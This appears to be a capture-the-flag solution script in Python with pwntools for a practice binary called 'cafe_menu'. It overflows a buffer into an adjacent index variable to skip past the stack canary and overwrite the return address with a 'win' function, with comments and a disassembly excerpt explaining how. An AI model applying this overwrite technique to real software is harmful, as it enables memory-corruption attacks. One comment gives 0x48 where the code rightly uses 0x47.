#!/usr/bin/env python3
from pwn import *

# Config
#context.log_level = 'debug'
elf = context.binary = ELF("./cafe_menu", checksec=False)
p = process(elf.path)
REMOTE_HOST = 'offsec.m0lecon.it'
HOST_PORT = 13587
#p= remote(REMOTE_HOST,HOST_PORT)


BUF_LEN = 48
"""
BUFFER[48]
IDX [8]
CANARY[8]
RBP[8]
RET <-- target => buffer_length + idx(variable) + canary+ rbp =48+8+8+8 = 72 offset to  return

The idea is to exploit the index (idx), to write outside the buffer directly in the return instruction bypassing the canary, since buffer and idx are adiacent into the stack,so we overflow the buffer until we start to write into idx(48byte), now in idx we write the "offset" of the return address which is 48+8+8+8=72 (taking into account the fact that in the next cycle the address will be increased by 1, so we acctually write 72-1=71=>0x48).
From to now the byte readed by the application are acctualy writed into the retun instruction
Now when the byte read cycle ends(0xff end the cycle) and the application is returned, the control is not given to the main, but to the fuction that we overwrite exploiting the idx of the buffer. 

\x47 -->  offset to RIP -1, will reach RIP addres with the next iteration
"""




p.recvuntil(b"Enter today's specials (send 0xff to finish):\n")

payload = flat(
    b"A" * BUF_LEN,
    b"\x47",        #<-- set the index in order to poit to RET 
    p64(elf.sym.win), #<-- overwtrite the RET
    b"\xff" 
)



p.send(payload)
p.interactive()
"""
401308:	e8 b3 fd ff ff       	call   4010c0 <read@plt>
  40130d:	48 83 f8 01          	cmp    $0x1,%rax
  401311:	75 2a                	jne    40133d <vuln+0x79>
  401313:	0f b6 45 bf          	movzbl -0x41(%rbp),%eax
  401317:	3c ff                	cmp    $0xff,%al
  401319:	74 25                	je     401340 <vuln+0x7c>
  40131b:	8b 55 f0             	mov    -0x10(%rbp),%edx <-- is the IDX
  40131e:	0f b6 45 bf          	movzbl -0x41(%rbp),%eax <<- is the BUFFER
"""
